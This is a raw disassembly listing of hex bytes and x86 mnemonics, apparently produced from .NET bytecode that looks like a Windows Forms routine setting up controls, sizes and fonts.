  4025ac:	00 00                	add    %al,(%eax)
  4025ae:	04 20                	add    $0x20,%al
  4025b0:	02 02                	add    (%edx),%al
  4025b2:	00 00                	add    %al,(%eax)
  4025b4:	1f                   	pop    %ds
  4025b5:	26 73 41             	es jae 0x4025f9
  4025b8:	00 00                	add    %al,(%eax)
  4025ba:	0a 6f 42             	or     0x42(%edi),%ch
  4025bd:	00 00                	add    %al,(%eax)
  4025bf:	0a 02                	or     (%edx),%al
  4025c1:	7b 0b                	jnp    0x4025ce
  4025c3:	00 00                	add    %al,(%eax)
  4025c5:	04 1a                	add    $0x1a,%al
  4025c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4025c8:	43                   	inc    %ebx
  4025c9:	00 00                	add    %al,(%eax)
  4025cb:	0a 02                	or     (%edx),%al
  4025cd:	7b 0c                	jnp    0x4025db
  4025cf:	00 00                	add    %al,(%eax)
  4025d1:	04 1f                	add    $0x1f,%al
  4025d3:	09 6f 46             	or     %ebp,0x46(%edi)
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	0a 02                	or     (%edx),%al
  4025da:	7b 0c                	jnp    0x4025e8
  4025dc:	00 00                	add    %al,(%eax)
  4025de:	04 28                	add    $0x28,%al
  4025e0:	44                   	inc    %esp
  4025e1:	00 00                	add    %al,(%eax)
  4025e3:	0a 6f 47             	or     0x47(%edi),%ch
  4025e6:	00 00                	add    %al,(%eax)
  4025e8:	0a 02                	or     (%edx),%al
  4025ea:	7b 0c                	jnp    0x4025f8
  4025ec:	00 00                	add    %al,(%eax)
  4025ee:	04 1b                	add    $0x1b,%al
  4025f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025f1:	48                   	dec    %eax
  4025f2:	00 00                	add    %al,(%eax)
  4025f4:	0a 02                	or     (%edx),%al
  4025f6:	7b 0c                	jnp    0x402604
  4025f8:	00 00                	add    %al,(%eax)
  4025fa:	04 19                	add    $0x19,%al
  4025fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4025fd:	49                   	dec    %ecx
  4025fe:	00 00                	add    %al,(%eax)
  402600:	0a 02                	or     (%edx),%al
  402602:	7b 0c                	jnp    0x402610
  402604:	00 00                	add    %al,(%eax)
  402606:	04 16                	add    $0x16,%al
  402608:	6f                   	outsl  %ds:(%esi),(%dx)
  402609:	4a                   	dec    %edx
  40260a:	00 00                	add    %al,(%eax)
  40260c:	0a 02                	or     (%edx),%al
  40260e:	7b 0c                	jnp    0x40261c
  402610:	00 00                	add    %al,(%eax)
  402612:	04 28                	add    $0x28,%al
  402614:	4b                   	dec    %ebx
  402615:	00 00                	add    %al,(%eax)
  402617:	0a 6f 4c             	or     0x4c(%edi),%ch
  40261a:	00 00                	add    %al,(%eax)
  40261c:	0a 02                	or     (%edx),%al
  40261e:	7b 0c                	jnp    0x40262c
  402620:	00 00                	add    %al,(%eax)
  402622:	04 28                	add    $0x28,%al
  402624:	44                   	inc    %esp
  402625:	00 00                	add    %al,(%eax)
  402627:	0a 6f 4d             	or     0x4d(%edi),%ch
  40262a:	00 00                	add    %al,(%eax)
  40262c:	0a 02                	or     (%edx),%al
  40262e:	7b 0c                	jnp    0x40263c
  402630:	00 00                	add    %al,(%eax)
  402632:	04 20                	add    $0x20,%al
  402634:	96                   	xchg   %eax,%esi
  402635:	01 00                	add    %eax,(%eax)
  402637:	00 19                	add    %bl,(%ecx)
  402639:	73 3e                	jae    0x402679
  40263b:	00 00                	add    %al,(%eax)
  40263d:	0a 6f 3f             	or     0x3f(%edi),%ch
  402640:	00 00                	add    %al,(%eax)
  402642:	0a 02                	or     (%edx),%al
  402644:	7b 0c                	jnp    0x402652
  402646:	00 00                	add    %al,(%eax)
  402648:	04 72                	add    $0x72,%al
  40264a:	9d                   	popf
  40264b:	00 00                	add    %al,(%eax)
  40264d:	70 6f                	jo     0x4026be
  40264f:	40                   	inc    %eax
  402650:	00 00                	add    %al,(%eax)
  402652:	0a 02                	or     (%edx),%al
  402654:	7b 0c                	jnp    0x402662
  402656:	00 00                	add    %al,(%eax)
  402658:	04 1f                	add    $0x1f,%al
  40265a:	2d 1f 1d 73 41       	sub    $0x41731d1f,%eax
  40265f:	00 00                	add    %al,(%eax)
  402661:	0a 6f 42             	or     0x42(%edi),%ch
  402664:	00 00                	add    %al,(%eax)
  402666:	0a 02                	or     (%edx),%al
  402668:	7b 0c                	jnp    0x402676
  40266a:	00 00                	add    %al,(%eax)
  40266c:	04 17                	add    $0x17,%al
  40266e:	6f                   	outsl  %ds:(%esi),(%dx)
  40266f:	43                   	inc    %ebx
  402670:	00 00                	add    %al,(%eax)
  402672:	0a 02                	or     (%edx),%al
  402674:	7b 0d                	jnp    0x402683
  402676:	00 00                	add    %al,(%eax)
  402678:	04 1f                	add    $0x1f,%al
  40267a:	09 6f 46             	or     %ebp,0x46(%edi)
  40267d:	00 00                	add    %al,(%eax)
  40267f:	0a 02                	or     (%edx),%al
  402681:	7b 0d                	jnp    0x402690
  402683:	00 00                	add    %al,(%eax)
  402685:	04 28                	add    $0x28,%al
  402687:	44                   	inc    %esp
  402688:	00 00                	add    %al,(%eax)
  40268a:	0a 6f 47             	or     0x47(%edi),%ch
  40268d:	00 00                	add    %al,(%eax)
  40268f:	0a 02                	or     (%edx),%al
  402691:	7b 0d                	jnp    0x4026a0
  402693:	00 00                	add    %al,(%eax)
  402695:	04 1b                	add    $0x1b,%al
  402697:	6f                   	outsl  %ds:(%esi),(%dx)
  402698:	48                   	dec    %eax
  402699:	00 00                	add    %al,(%eax)
  40269b:	0a 02                	or     (%edx),%al
  40269d:	7b 0d                	jnp    0x4026ac
  40269f:	00 00                	add    %al,(%eax)
  4026a1:	04 19                	add    $0x19,%al
  4026a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4026a4:	49                   	dec    %ecx
  4026a5:	00 00                	add    %al,(%eax)
  4026a7:	0a 02                	or     (%edx),%al
  4026a9:	7b 0d                	jnp    0x4026b8
  4026ab:	00 00                	add    %al,(%eax)
  4026ad:	04 28                	add    $0x28,%al
  4026af:	4b                   	dec    %ebx
  4026b0:	00 00                	add    %al,(%eax)
  4026b2:	0a 6f 4c             	or     0x4c(%edi),%ch
  4026b5:	00 00                	add    %al,(%eax)
  4026b7:	0a 02                	or     (%edx),%al
  4026b9:	7b 0d                	jnp    0x4026c8
  4026bb:	00 00                	add    %al,(%eax)
  4026bd:	04 28                	add    $0x28,%al
  4026bf:	44                   	inc    %esp
  4026c0:	00 00                	add    %al,(%eax)
  4026c2:	0a 6f 4d             	or     0x4d(%edi),%ch
  4026c5:	00 00                	add    %al,(%eax)
  4026c7:	0a 02                	or     (%edx),%al
  4026c9:	7b 0d                	jnp    0x4026d8
  4026cb:	00 00                	add    %al,(%eax)
  4026cd:	04 20                	add    $0x20,%al
  4026cf:	c9                   	leave
  4026d0:	01 00                	add    %eax,(%eax)
  4026d2:	00 19                	add    %bl,(%ecx)
  4026d4:	73 3e                	jae    0x402714
  4026d6:	00 00                	add    %al,(%eax)
  4026d8:	0a 6f 3f             	or     0x3f(%edi),%ch
  4026db:	00 00                	add    %al,(%eax)
  4026dd:	0a 02                	or     (%edx),%al
  4026df:	7b 0d                	jnp    0x4026ee
  4026e1:	00 00                	add    %al,(%eax)
  4026e3:	04 72                	add    $0x72,%al
  4026e5:	bf 00 00 70 6f       	mov    $0x6f700000,%edi
  4026ea:	40                   	inc    %eax
  4026eb:	00 00                	add    %al,(%eax)
  4026ed:	0a 02                	or     (%edx),%al
  4026ef:	7b 0d                	jnp    0x4026fe
  4026f1:	00 00                	add    %al,(%eax)
  4026f3:	04 1f                	add    $0x1f,%al
  4026f5:	2d 1f 1d 73 41       	sub    $0x41731d1f,%eax
  4026fa:	00 00                	add    %al,(%eax)
  4026fc:	0a 6f 42             	or     0x42(%edi),%ch
  4026ff:	00 00                	add    %al,(%eax)
  402701:	0a 02                	or     (%edx),%al
  402703:	7b 0d                	jnp    0x402712
  402705:	00 00                	add    %al,(%eax)
  402707:	04 16                	add    $0x16,%al
  402709:	6f                   	outsl  %ds:(%esi),(%dx)
  40270a:	43                   	inc    %ebx
  40270b:	00 00                	add    %al,(%eax)
  40270d:	0a 02                	or     (%edx),%al
  40270f:	7b 08                	jnp    0x402719
  402711:	00 00                	add    %al,(%eax)
  402713:	04 28                	add    $0x28,%al
  402715:	4b                   	dec    %ebx
  402716:	00 00                	add    %al,(%eax)
  402718:	0a 6f 3a             	or     0x3a(%edi),%ch
  40271b:	00 00                	add    %al,(%eax)
  40271d:	0a 02                	or     (%edx),%al
  40271f:	7b 08                	jnp    0x402729
  402721:	00 00                	add    %al,(%eax)
  402723:	04 72                	add    $0x72,%al
  402725:	e1 00                	loope  0x402727
  402727:	00 70 22             	add    %dh,0x22(%eax)
  40272a:	00 00                	add    %al,(%eax)
  40272c:	90                   	nop
  40272d:	41                   	inc    %ecx
  40272e:	17                   	pop    %ss
  40272f:	73 4e                	jae    0x40277f
  402731:	00 00                	add    %al,(%eax)
  402733:	0a 6f 4f             	or     0x4f(%edi),%ch
  402736:	00 00                	add    %al,(%eax)
  402738:	0a 02                	or     (%edx),%al
  40273a:	7b 08                	jnp    0x402744
  40273c:	00 00                	add    %al,(%eax)
  40273e:	04 28                	add    $0x28,%al
  402740:	44                   	inc    %esp
  402741:	00 00                	add    %al,(%eax)
  402743:	0a 6f 50             	or     0x50(%edi),%ch
  402746:	00 00                	add    %al,(%eax)
  402748:	0a 02                	or     (%edx),%al
  40274a:	7b 08                	jnp    0x402754
  40274c:	00 00                	add    %al,(%eax)
  40274e:	04 20                	add    $0x20,%al
  402750:	81 00 00 00 1f 3d    	addl   $0x3d1f0000,(%eax)
  402756:	73 3e                	jae    0x402796
  402758:	00 00                	add    %al,(%eax)
  40275a:	0a 6f 3f             	or     0x3f(%edi),%ch
  40275d:	00 00                	add    %al,(%eax)
  40275f:	0a 02                	or     (%edx),%al
  402761:	7b 08                	jnp    0x40276b
  402763:	00 00                	add    %al,(%eax)
  402765:	04 72                	add    $0x72,%al
  402767:	f3 00 00             	repz add %al,(%eax)
  40276a:	70 6f                	jo     0x4027db
  40276c:	40                   	inc    %eax
  40276d:	00 00                	add    %al,(%eax)
  40276f:	0a 02                	or     (%edx),%al
  402771:	7b 08                	jnp    0x40277b
  402773:	00 00                	add    %al,(%eax)
  402775:	04 20                	add    $0x20,%al
  402777:	19 01                	sbb    %eax,(%ecx)
  402779:	00 00                	add    %al,(%eax)
  40277b:	1f                   	pop    %ds
  40277c:	22 73 41             	and    0x41(%ebx),%dh
  40277f:	00 00                	add    %al,(%eax)
  402781:	0a 6f 42             	or     0x42(%edi),%ch
  402784:	00 00                	add    %al,(%eax)
  402786:	0a 02                	or     (%edx),%al
  402788:	7b 08                	jnp    0x402792
  40278a:	00 00                	add    %al,(%eax)
  40278c:	04 19                	add    $0x19,%al
  40278e:	6f                   	outsl  %ds:(%esi),(%dx)
  40278f:	43                   	inc    %ebx
  402790:	00 00                	add    %al,(%eax)
  402792:	0a 02                	or     (%edx),%al
  402794:	7b 08                	jnp    0x40279e
  402796:	00 00                	add    %al,(%eax)
  402798:	04 72                	add    $0x72,%al
  40279a:	13 01                	adc    (%ecx),%eax
  40279c:	00 70 6f             	add    %dh,0x6f(%eax)
  40279f:	51                   	push   %ecx
  4027a0:	00 00                	add    %al,(%eax)
  4027a2:	0a 02                	or     (%edx),%al
  4027a4:	7b 07                	jnp    0x4027ad
  4027a6:	00 00                	add    %al,(%eax)
  4027a8:	04 1f                	add    $0x1f,%al
  4027aa:	0a 6f 52             	or     0x52(%edi),%ch
  4027ad:	00 00                	add    %al,(%eax)
  4027af:	0a 02                	or     (%edx),%al
  4027b1:	7b 07                	jnp    0x4027ba
  4027b3:	00 00                	add    %al,(%eax)
  4027b5:	04 20                	add    $0x20,%al
  4027b7:	c8 00 00 00          	enter  $0x0,$0x0
  4027bb:	16                   	push   %ss
  4027bc:	16                   	push   %ss
  4027bd:	28 39                	sub    %bh,(%ecx)
  4027bf:	00 00                	add    %al,(%eax)
  4027c1:	0a 6f 53             	or     0x53(%edi),%ch
  4027c4:	00 00                	add    %al,(%eax)
  4027c6:	0a 02                	or     (%edx),%al
  4027c8:	7b 07                	jnp    0x4027d1
  4027ca:	00 00                	add    %al,(%eax)
  4027cc:	04 72                	add    $0x72,%al
  4027ce:	e1 00                	loope  0x4027d0
  4027d0:	00 70 22             	add    %dh,0x22(%eax)
  4027d3:	00 00                	add    %al,(%eax)
  4027d5:	40                   	inc    %eax
  4027d6:	41                   	inc    %ecx
  4027d7:	17                   	pop    %ss
  4027d8:	73 4e                	jae    0x402828
  4027da:	00 00                	add    %al,(%eax)
  4027dc:	0a 6f 4f             	or     0x4f(%edi),%ch
  4027df:	00 00                	add    %al,(%eax)
  4027e1:	0a 02                	or     (%edx),%al
  4027e3:	7b 07                	jnp    0x4027ec
  4027e5:	00 00                	add    %al,(%eax)
  4027e7:	04 28                	add    $0x28,%al
  4027e9:	44                   	inc    %esp
  4027ea:	00 00                	add    %al,(%eax)
  4027ec:	0a 6f 50             	or     0x50(%edi),%ch
  4027ef:	00 00                	add    %al,(%eax)
  4027f1:	0a 02                	or     (%edx),%al
  4027f3:	7b 07                	jnp    0x4027fc
  4027f5:	00 00                	add    %al,(%eax)
  4027f7:	04 20                	add    $0x20,%al
  4027f9:	81 00 00 00 20 d9    	addl   $0xd9200000,(%eax)
  4027ff:	00 00                	add    %al,(%eax)
  402801:	00 73 3e             	add    %dh,0x3e(%ebx)
  402804:	00 00                	add    %al,(%eax)
  402806:	0a 6f 3f             	or     0x3f(%edi),%ch
  402809:	00 00                	add    %al,(%eax)
  40280b:	0a 02                	or     (%edx),%al
  40280d:	7b 07                	jnp    0x402816
  40280f:	00 00                	add    %al,(%eax)
  402811:	04 72                	add    $0x72,%al
  402813:	37                   	aaa
  402814:	01 00                	add    %eax,(%eax)
  402816:	70 6f                	jo     0x402887
  402818:	40                   	inc    %eax
  402819:	00 00                	add    %al,(%eax)
  40281b:	0a 02                	or     (%edx),%al
  40281d:	7b 07                	jnp    0x402826
  40281f:	00 00                	add    %al,(%eax)
  402821:	04 20                	add    $0x20,%al
  402823:	01 01                	add    %eax,(%ecx)
  402825:	00 00                	add    %al,(%eax)
  402827:	1f                   	pop    %ds
  402828:	2b 73 41             	sub    0x41(%ebx),%esi
  40282b:	00 00                	add    %al,(%eax)
  40282d:	0a 6f 42             	or     0x42(%edi),%ch
  402830:	00 00                	add    %al,(%eax)
  402832:	0a 02                	or     (%edx),%al
  402834:	7b 07                	jnp    0x40283d
  402836:	00 00                	add    %al,(%eax)
  402838:	04 18                	add    $0x18,%al
  40283a:	6f                   	outsl  %ds:(%esi),(%dx)
  40283b:	43                   	inc    %ebx
  40283c:	00 00                	add    %al,(%eax)
  40283e:	0a 02                	or     (%edx),%al
  402840:	7b 07                	jnp    0x402849
  402842:	00 00                	add    %al,(%eax)
  402844:	04 72                	add    $0x72,%al
  402846:	51                   	push   %ecx
  402847:	01 00                	add    %eax,(%eax)
  402849:	70 6f                	jo     0x4028ba
  40284b:	51                   	push   %ecx
  40284c:	00 00                	add    %al,(%eax)
  40284e:	0a 02                	or     (%edx),%al
  402850:	7b 07                	jnp    0x402859
  402852:	00 00                	add    %al,(%eax)
  402854:	04 02                	add    $0x2,%al
  402856:	fe 06                	incb   (%esi)
  402858:	0f 00 00             	sldt   (%eax)
  40285b:	06                   	push   %es
  40285c:	73 54                	jae    0x4028b2
  40285e:	00 00                	add    %al,(%eax)
  402860:	0a 6f 55             	or     0x55(%edi),%ch
  402863:	00 00                	add    %al,(%eax)
  402865:	0a 02                	or     (%edx),%al
  402867:	7b 06                	jnp    0x40286f
  402869:	00 00                	add    %al,(%eax)
  40286b:	04 1e                	add    $0x1e,%al
  40286d:	6f                   	outsl  %ds:(%esi),(%dx)
  40286e:	56                   	push   %esi
  40286f:	00 00                	add    %al,(%eax)
  402871:	0a 02                	or     (%edx),%al
  402873:	7b 06                	jnp    0x40287b
  402875:	00 00                	add    %al,(%eax)
  402877:	04 1f                	add    $0x1f,%al
  402879:	1e                   	push   %ds
  40287a:	1f                   	pop    %ds
  40287b:	1e                   	push   %ds
  40287c:	1f                   	pop    %ds
  40287d:	28 28                	sub    %ch,(%eax)
  40287f:	39 00                	cmp    %eax,(%eax)
  402881:	00 0a                	add    %cl,(%edx)
  402883:	6f                   	outsl  %ds:(%esi),(%dx)
  402884:	57                   	push   %edi
  402885:	00 00                	add    %al,(%eax)
  402887:	0a 02                	or     (%edx),%al
  402889:	7b 06                	jnp    0x402891
  40288b:	00 00                	add    %al,(%eax)
  40288d:	04 20                	add    $0x20,%al
  40288f:	81 00 00 00 20 9c    	addl   $0x9c200000,(%eax)
  402895:	00 00                	add    %al,(%eax)
  402897:	00 73 3e             	add    %dh,0x3e(%ebx)
  40289a:	00 00                	add    %al,(%eax)
  40289c:	0a 6f 3f             	or     0x3f(%edi),%ch
  40289f:	00 00                	add    %al,(%eax)
  4028a1:	0a 02                	or     (%edx),%al
  4028a3:	7b 06                	jnp    0x4028ab
  4028a5:	00 00                	add    %al,(%eax)
  4028a7:	04 72                	add    $0x72,%al
  4028a9:	5b                   	pop    %ebx
  4028aa:	01 00                	add    %eax,(%eax)
  4028ac:	70 6f                	jo     0x40291d
  4028ae:	40                   	inc    %eax
  4028af:	00 00                	add    %al,(%eax)
  4028b1:	0a 02                	or     (%edx),%al
  4028b3:	7b 06                	jnp    0x4028bb
  4028b5:	00 00                	add    %al,(%eax)
  4028b7:	04 20                	add    $0x20,%al
  4028b9:	01 01                	add    %eax,(%ecx)
  4028bb:	00 00                	add    %al,(%eax)
  4028bd:	1f                   	pop    %ds
  4028be:	11 73 41             	adc    %esi,0x41(%ebx)
  4028c1:	00 00                	add    %al,(%eax)
  4028c3:	0a 6f 42             	or     0x42(%edi),%ch
  4028c6:	00 00                	add    %al,(%eax)
  4028c8:	0a 02                	or     (%edx),%al
  4028ca:	7b 06                	jnp    0x4028d2
  4028cc:	00 00                	add    %al,(%eax)
  4028ce:	04 16                	add    $0x16,%al
  4028d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4028d1:	43                   	inc    %ebx
  4028d2:	00 00                	add    %al,(%eax)
  4028d4:	0a 02                	or     (%edx),%al
  4028d6:	7b 06                	jnp    0x4028de
  4028d8:	00 00                	add    %al,(%eax)
  4028da:	04 16                	add    $0x16,%al
  4028dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4028dd:	58                   	pop    %eax
  4028de:	00 00                	add    %al,(%eax)
  4028e0:	0a 02                	or     (%edx),%al
  4028e2:	7b 09                	jnp    0x4028ed
  4028e4:	00 00                	add    %al,(%eax)
  4028e6:	04 1b                	add    $0x1b,%al
  4028e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4028e9:	59                   	pop    %ecx
  4028ea:	00 00                	add    %al,(%eax)
  4028ec:	0a 02                	or     (%edx),%al
  4028ee:	7b 09                	jnp    0x4028f9
  4028f0:	00 00                	add    %al,(%eax)
  4028f2:	04 02                	add    $0x2,%al
  4028f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4028f5:	5a                   	pop    %edx
  4028f6:	00 00                	add    %al,(%eax)
  4028f8:	0a 02                	or     (%edx),%al
  4028fa:	7b 09                	jnp    0x402905
  4028fc:	00 00                	add    %al,(%eax)
  4028fe:	04 23                	add    $0x23,%al
  402900:	33 33                	xor    (%ebx),%esi
  402902:	33 33                	xor    (%ebx),%esi
  402904:	33 33                	xor    (%ebx),%esi
  402906:	e3 3f                	jecxz  0x402947
  402908:	6f                   	outsl  %ds:(%esi),(%dx)
  402909:	5b                   	pop    %ebx
  40290a:	00 00                	add    %al,(%eax)
  40290c:	0a 02                	or     (%edx),%al
  40290e:	7b 09                	jnp    0x402919
  402910:	00 00                	add    %al,(%eax)
  402912:	04 17                	add    $0x17,%al
  402914:	6f                   	outsl  %ds:(%esi),(%dx)
  402915:	5c                   	pop    %esp
  402916:	00 00                	add    %al,(%eax)
  402918:	0a 02                	or     (%edx),%al
  40291a:	7b 0e                	jnp    0x40292a
  40291c:	00 00                	add    %al,(%eax)
  40291e:	04 23                	add    $0x23,%al
  402920:	33 33                	xor    (%ebx),%esi
  402922:	33 33                	xor    (%ebx),%esi
  402924:	33 33                	xor    (%ebx),%esi
  402926:	e3 3f                	jecxz  0x402967
  402928:	6f                   	outsl  %ds:(%esi),(%dx)
  402929:	5d                   	pop    %ebp
  40292a:	00 00                	add    %al,(%eax)
  40292c:	0a 02                	or     (%edx),%al
  40292e:	7b 0e                	jnp    0x40293e
  402930:	00 00                	add    %al,(%eax)
  402932:	04 02                	add    $0x2,%al
  402934:	7b 0b                	jnp    0x402941
  402936:	00 00                	add    %al,(%eax)
  402938:	04 6f                	add    $0x6f,%al
  40293a:	5e                   	pop    %esi
  40293b:	00 00                	add    %al,(%eax)
  40293d:	0a 02                	or     (%edx),%al
  40293f:	7b 0e                	jnp    0x40294f
  402941:	00 00                	add    %al,(%eax)
  402943:	04 17                	add    $0x17,%al
  402945:	6f                   	outsl  %ds:(%esi),(%dx)
  402946:	5f                   	pop    %edi
  402947:	00 00                	add    %al,(%eax)
  402949:	0a 02                	or     (%edx),%al
  40294b:	22 00                	and    (%eax),%al
  40294d:	00 c0                	add    %al,%al
  40294f:	40                   	inc    %eax
  402950:	22 00                	and    (%eax),%al
  402952:	00 50 41             	add    %dl,0x41(%eax)
  402955:	73 60                	jae    0x4029b7
  402957:	00 00                	add    %al,(%eax)
  402959:	0a 28                	or     (%eax),%ch
  40295b:	61                   	popa
  40295c:	00 00                	add    %al,(%eax)
  40295e:	0a 02                	or     (%edx),%al
  402960:	17                   	pop    %ss
  402961:	28 62 00             	sub    %ah,0x0(%edx)
  402964:	00 0a                	add    %cl,(%edx)
  402966:	02 28                	add    (%eax),%ch
  402968:	63 00                	arpl   %eax,(%eax)
  40296a:	00 0a                	add    %cl,(%edx)
  40296c:	6f                   	outsl  %ds:(%esi),(%dx)
  40296d:	3a 00                	cmp    (%eax),%al
  40296f:	00 0a                	add    %cl,(%edx)
  402971:	02 20                	add    (%eax),%ah
  402973:	02 02                	add    (%edx),%al
  402975:	00 00                	add    %al,(%eax)
  402977:	20 5b 01             	and    %bl,0x1(%ebx)
  40297a:	00 00                	add    %al,(%eax)
  40297c:	73 41                	jae    0x4029bf
  40297e:	00 00                	add    %al,(%eax)
  402980:	0a 28                	or     (%eax),%ch
  402982:	64 00 00             	add    %al,%fs:(%eax)
  402985:	0a 02                	or     (%edx),%al
  402987:	28 3b                	sub    %bh,(%ebx)
  402989:	00 00                	add    %al,(%eax)
  40298b:	0a 02                	or     (%edx),%al
  40298d:	7b 05                	jnp    0x402994
  40298f:	00 00                	add    %al,(%eax)
  402991:	04 6f                	add    $0x6f,%al
  402993:	3c 00                	cmp    $0x0,%al
  402995:	00 0a                	add    %cl,(%edx)
  402997:	02 16                	add    (%esi),%dl
  402999:	28 65 00             	sub    %ah,0x0(%ebp)
  40299c:	00 0a                	add    %cl,(%edx)
  40299e:	02 16                	add    (%esi),%dl
  4029a0:	28 66 00             	sub    %ah,0x0(%esi)
  4029a3:	00 0a                	add    %cl,(%edx)
  4029a5:	02 72 7f             	add    0x7f(%edx),%dh
  4029a8:	01 00                	add    %eax,(%eax)
  4029aa:	70 28                	jo     0x4029d4
  4029ac:	40                   	inc    %eax
  4029ad:	00 00                	add    %al,(%eax)
  4029af:	0a 02                	or     (%edx),%al
  4029b1:	16                   	push   %ss
  4029b2:	28 67 00             	sub    %ah,0x0(%edi)
  4029b5:	00 0a                	add    %cl,(%edx)
  4029b7:	02 17                	add    (%edi),%dl
  4029b9:	28 68 00             	sub    %ch,0x0(%eax)
  4029bc:	00 0a                	add    %cl,(%edx)
  4029be:	02 72 8b             	add    -0x75(%edx),%dh
  4029c1:	01 00                	add    %eax,(%eax)
  4029c3:	70 6f                	jo     0x402a34
  4029c5:	51                   	push   %ecx
  4029c6:	00 00                	add    %al,(%eax)
  4029c8:	0a 02                	or     (%edx),%al
  4029ca:	7b 05                	jnp    0x4029d1
  4029cc:	00 00                	add    %al,(%eax)
  4029ce:	04 16                	add    $0x16,%al
  4029d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4029d1:	69 00 00 0a 02 7b    	imul   $0x7b020a00,(%eax),%eax
  4029d7:	05 00 00 04 6f       	add    $0x6f040000,%eax
  4029dc:	6a 00                	push   $0x0
  4029de:	00 0a                	add    %cl,(%edx)
  4029e0:	02 7b 0b             	add    0xb(%ebx),%bh
  4029e3:	00 00                	add    %al,(%eax)
  4029e5:	04 16                	add    $0x16,%al
  4029e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029e8:	69 00 00 0a 02 16    	imul   $0x16020a00,(%eax),%eax
  4029ee:	28 69 00             	sub    %ch,0x0(%ecx)
  4029f1:	00 0a                	add    %cl,(%edx)
  4029f3:	2a d6                	sub    %dh,%dl
  4029f5:	02 28                	add    (%eax),%ch
  4029f7:	6b 00 00             	imul   $0x0,(%eax),%eax
  4029fa:	0a 2c 27             	or     (%edi,%eiz,1),%ch
  4029fd:	02 7e 10             	add    0x10(%esi),%bh
  402a00:	00 00                	add    %al,(%eax)
  402a02:	04 25                	add    $0x25,%al
  402a04:	2d 17 26 7e 0f       	sub    $0xf7e2617,%eax
  402a09:	00 00                	add    %al,(%eax)
  402a0b:	04 fe                	add    $0xfe,%al
  402a0d:	06                   	push   %es
  402a0e:	18 00                	sbb    %al,(%eax)
  402a10:	00 06                	add    %al,(%esi)
  402a12:	73 6c                	jae    0x402a80
  402a14:	00 00                	add    %al,(%eax)
  402a16:	0a 25 80 10 00 00    	or     0x1080,%ah
  402a1c:	04 28                	add    $0x28,%al
  402a1e:	6d                   	insl   (%dx),%es:(%edi)
  402a1f:	00 00                	add    %al,(%eax)
  402a21:	0a 26                	or     (%esi),%ah
  402a23:	2a 28                	sub    (%eax),%ch
  402a25:	6e                   	outsb  %ds:(%esi),(%dx)
  402a26:	00 00                	add    %al,(%eax)
  402a28:	0a 2a                	or     (%edx),%ch
  402a2a:	2e 73 17             	jae,pn 0x402a44
  402a2d:	00 00                	add    %al,(%eax)
  402a2f:	06                   	push   %es
  402a30:	80 0f 00             	orb    $0x0,(%edi)
  402a33:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402a36:	1e                   	push   %ds
  402a37:	02 28                	add    (%eax),%ch
  402a39:	1b 00                	sbb    (%eax),%eax
  402a3b:	00 0a                	add    %cl,(%edx)
  402a3d:	2a 1a                	sub    (%edx),%bl
  402a3f:	28 6e 00             	sub    %ch,0x0(%esi)
  402a42:	00 0a                	add    %cl,(%edx)
  402a44:	2a 1e                	sub    (%esi),%bl
  402a46:	02 28                	add    (%eax),%ch
  402a48:	1b 00                	sbb    (%eax),%eax
  402a4a:	00 0a                	add    %cl,(%edx)
  402a4c:	2a 00                	sub    (%eax),%al
  402a4e:	00 00                	add    %al,(%eax)
  402a50:	1b 30                	sbb    (%eax),%esi
  402a52:	03 00                	add    (%eax),%eax
  402a54:	8b 00                	mov    (%eax),%eax
  402a56:	00 00                	add    %al,(%eax)
  402a58:	0a 00                	or     (%eax),%al
  402a5a:	00 11                	add    %dl,(%ecx)
  402a5c:	02 7b 11             	add    0x11(%ebx),%bh
  402a5f:	00 00                	add    %al,(%eax)
  402a61:	04 73                	add    $0x73,%al
  402a63:	6f                   	outsl  %ds:(%esi),(%dx)
  402a64:	00 00                	add    %al,(%eax)
  402a66:	0a 0a                	or     (%edx),%cl
  402a68:	73 70                	jae    0x402ada
  402a6a:	00 00                	add    %al,(%eax)
  402a6c:	0a 0b                	or     (%ebx),%cl
  402a6e:	16                   	push   %ss
  402a6f:	0c 2b                	or     $0x2b,%al
  402a71:	4b                   	dec    %ebx
  402a72:	16                   	push   %ss
  402a73:	0d 2b 3a 06 09       	or     $0x9063a2b,%eax
  402a78:	08 6f 71             	or     %ch,0x71(%edi)
  402a7b:	00 00                	add    %al,(%eax)
  402a7d:	0a 13                	or     (%ebx),%dl
  402a7f:	04 12                	add    $0x12,%al
  402a81:	04 28                	add    $0x28,%al
  402a83:	72 00                	jb     0x402a85
  402a85:	00 0a                	add    %cl,(%edx)
  402a87:	2d 12 12 04 28       	sub    $0x28041212,%eax
  402a8c:	73 00                	jae    0x402a8e
  402a8e:	00 0a                	add    %cl,(%edx)
  402a90:	2d 09 12 04 28       	sub    $0x28041209,%eax
  402a95:	74 00                	je     0x402a97
  402a97:	00 0a                	add    %cl,(%edx)
  402a99:	2c 11                	sub    $0x11,%al
  402a9b:	12 04 28             	adc    (%eax,%ebp,1),%al
  402a9e:	73 00                	jae    0x402aa0
  402aa0:	00 0a                	add    %cl,(%edx)
  402aa2:	13 05 07 11 05 6f    	adc    0x6f051107,%eax
  402aa8:	75 00                	jne    0x402aaa
  402aaa:	00 0a                	add    %cl,(%edx)
  402aac:	09 17                	or     %edx,(%edi)
  402aae:	58                   	pop    %eax
  402aaf:	0d 09 06 6f 76       	or     $0x766f0609,%eax
  402ab4:	00 00                	add    %al,(%eax)
  402ab6:	0a 32                	or     (%edx),%dh
  402ab8:	bd 08 17 58 0c       	mov    $0xc581708,%ebp
  402abd:	08 06                	or     %al,(%esi)
  402abf:	6f                   	outsl  %ds:(%esi),(%dx)
  402ac0:	77 00                	ja     0x402ac2
  402ac2:	00 0a                	add    %cl,(%edx)
  402ac4:	32 ac 07 6f 78 00 00 	xor    0x786f(%edi,%eax,1),%ch
  402acb:	0a 13                	or     (%ebx),%dl
  402acd:	06                   	push   %es
  402ace:	de 14 07             	ficoms (%edi,%eax,1)
  402ad1:	2c 06                	sub    $0x6,%al
  402ad3:	07                   	pop    %es
  402ad4:	6f                   	outsl  %ds:(%esi),(%dx)
